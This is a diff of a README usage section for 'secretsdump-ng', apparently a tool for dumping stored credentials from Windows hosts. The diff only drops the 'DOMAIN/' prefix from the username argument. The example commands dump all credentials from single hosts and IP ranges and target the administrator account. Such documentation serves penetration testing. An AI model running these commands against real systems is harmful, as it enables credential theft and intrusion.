@@ -30,19 +30,19 @@ System requirements:
 
 ```bash
 # Dump all credentials from a single host
-secretsdump-ng 192.168.1.10 DOMAIN/username password
+secretsdump-ng 192.168.1.10 username password
 
 # Dump from multiple hosts using IP range
-secretsdump-ng 192.168.1.10-20 DOMAIN/username password
+secretsdump-ng 192.168.1.10-20 username password
 
 # Dump only a specific user
-secretsdump-ng 192.168.1.10 DOMAIN/username password --just-dc-user administrator
+secretsdump-ng 192.168.1.10 username password --just-dc-user administrator
 
 # Use more threads for faster scanning
-secretsdump-ng 192.168.1.1-254 DOMAIN/username password --threads 20
+secretsdump-ng 192.168.1.1-254 username password --threads 20
 
 # Verbose output
-secretsdump-ng 192.168.1.10 DOMAIN/username password -v
+secretsdump-ng 192.168.1.10 username password -v
 ```
 
 ## How It Works
